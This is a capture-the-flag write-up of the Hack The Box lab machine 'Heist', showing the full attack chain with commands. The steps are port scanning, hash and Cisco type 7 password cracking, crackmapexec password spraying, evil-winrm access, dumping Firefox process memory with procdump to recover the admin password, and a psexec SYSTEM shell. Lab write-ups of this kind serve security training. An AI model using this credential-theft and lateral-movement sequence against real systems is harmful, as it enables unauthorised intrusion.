# Box Name: Heist
# Level: Easy
# OS: Windows
<hr>

Lets get started

# Recon

## Portscanning

command:```sudo nmap -A 10.129.96.157 -p- -v -T4```

```
Nmap scan report for 10.129.96.157
Host is up (0.40s latency).
Not shown: 65530 filtered tcp ports (no-response)
PORT      STATE SERVICE       VERSION
80/tcp    open  http          Microsoft IIS httpd 10.0
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
| http-title: Support Login Page
|_Requested resource was login.php
135/tcp   open  msrpc         Microsoft Windows RPC
445/tcp   open  microsoft-ds?
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
49669/tcp open  unknown
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
OS fingerprint not ideal because: Missing a closed TCP port so results incomplete
No OS matches for host
Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=264 (Good luck!)
IP ID Sequence Generation: Randomized
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2023-10-10T19:48:09
|_  start_date: N/A
|_clock-skew: -1s

TRACEROUTE (using port 445/tcp)
HOP RTT       ADDRESS
1   339.57 ms 10.10.16.1
2   340.07 ms 10.129.96.157

Read data files from: /usr/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Tue Oct 10 20:48:49 2023 -- 1 IP address (1 host up) scanned in 436.02 seconds
```
From our nmap scan we have quite a number of ports opened. We'll start our enumeration today from port 80



# Enumeration (Port 80)

Navigate to the webpage

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/2bc80794-25ca-4678-a4fb-5ca4fb869bb6)

We get this login page. Since we don't have any creds lets login as guest

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/58e61a19-7993-42ce-bdbf-8c6d4c00e149)
![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/d10915da-73c3-4987-bd9a-f3993ec38178)

Nice, this is a conversation between user ```Hazard``` and the ```admin```. 

Lets check out the configuration file user ```Hazard``` sent.

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/ce07dae4-06f7-4a39-96f6-d0f0e693bc2f)

From the above screenshot we can see encrypted passwords for users ```Hazard```, ```rout3r``` and ```admin```.

Lets try to crack the first password

```
┌──(bl4ck4non👽bl4ck4non-sec)-[~/Downloads/HTB/heist]
└─$ nano hash                                                        
                                                                                                                                                                                                                                             
┌──(bl4ck4non👽bl4ck4non-sec)-[~/Downloads/HTB/heist]
└─$ john hash --wordlist=/usr/share/wordlists/rockyou.txt            
Warning: detected hash type "md5crypt", but the string is also recognized as "md5crypt-long"
Use the "--format=md5crypt-long" option to force loading these as that type instead
Using default input encoding: UTF-8
Loaded 1 password hash (md5crypt, crypt(3) $1$ (and variants) [MD5 256/256 AVX2 8x3])
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
stealth1agent    (?)     
1g 0:00:01:07 DONE (2023-10-10 21:09) 0.01479g/s 51878p/s 51878c/s 51878C/s stealthy001..stcroix85
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
                                                                                                                                                                                                                                             
┌──(bl4ck4non👽bl4ck4non-sec)-[~/Downloads/HTB/heist]
└─$ cat hash
$1$pdQG$o8nrSzsGXeaduXrjlvKc91
```
We got the password to be ```stealth1agent```. Lets try gain access using winrm

command:```evil-winrm -u hazard -i 10.129.96.157 -p 'stealth1agent' -S```

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/84a4e6da-f73f-4053-8bf5-7fc5578fc32d)

oops, it didn't work

Lets try to crack the type 7 passwords. I used this online [tool](https://www.firewall.cx/cisco/cisco-routers/cisco-type7-password-crack.html) for it

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/4d258bd0-7e89-40bd-8ef3-da86a9befa38)
![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/8ece8d10-6f19-45d5-8f7d-6559deaea12f)

We now have 3 passwords, lets enumerate for potential users

We can try to enumerate users from the smb share using crackmapexec

command:```crackmapexec smb 10.129.94.141 -u hazard -p stealth1agent --rid-brute```

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/b270dc27-6a75-47cd-8fad-70cdb37fc033)

We now have potential users.

Save the users and passwords in different files, we'll use crackmapexec to get a match we can use to login via winrm

command:```crackmapexec winrm 10.129.94.141 -u users.txt -p passwords.txt```

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/e8ffff8c-6d52-4417-b959-d454035fecd2)

We got a match, now lets login with winrm

username:```chase```        password:```Q4)sJu\Y8qz*A3?d```

command:```evil-winrm -u chase -i 10.129.94.141 -p "Q4)sJu\Y8qz*A3?d"```

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/18e837e5-3695-4a51-849f-9418a416e3b1)

We got user shell hehe. Lets go ahead and escalate our privileges



# Privilege Escalation

Running the ```ps``` command to check the processes running

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/d6d43f37-4ccf-4210-b6ac-680a1fa34a73)

From the above screenshot we can see ```firefox``` to be one of the processes running

Lets try to dump the process using the tool ```procdump```. You can download it [here](https://download.sysinternals.com/files/Procdump.zip)

We'll upload this to the target's machine

command:```upload procdump.exe```

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/dc1db26a-3f6a-42f4-bdc3-c2df787ec936)

Nice, we can use the PID of firefox to create this dump

command:```.\procdump.exe -accepteula -ma 4120```

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/997e143e-31f7-4047-bce6-a209d020c16b)

So after creating the dump, I downloaded it to my machine using the ```download``` command

```
┌──(bl4ck4non👽bl4ck4non-sec)-[~/Downloads/HTB/heist]
└─$ ls           
Eula.txt  Procdump.zip  firefox.exe_231011_124132.dmp  hash  heist  passwords.txt  procdump.exe  procdump64.exe  procdump64a.exe  users.txt
                                                                                                                                                                                                                                             
┌──(bl4ck4non👽bl4ck4non-sec)-[~/Downloads/HTB/heist]
└─$ file firefox.exe_231011_124132.dmp                                                                               
firefox.exe_231011_124132.dmp: Mini DuMP crash report, 18 streams, Wed Oct 11 07:11:32 2023, 0x461826 type
```
Now, lets look for creds

command:```strings firefox.exe_231011_124132.dmp| grep "password"```

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/466acabe-3802-4b09-a250-ddd05224e40f)

nice nice, we got the admin password. 

Now, lets use psexec to connect

username:```administrator```      password:```4dD!5}x/re8]FBuZ```

command:```impacket-psexec administrator@10.129.94.202```

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/eea8a90c-64f4-459a-a4c8-b9d10cb5f1e6)

We spwned a shell as ```nt authority\system```, this means we have successfully pwned this box.

That will be all for today
<br><br>
[Back To Home](../../index.md)



























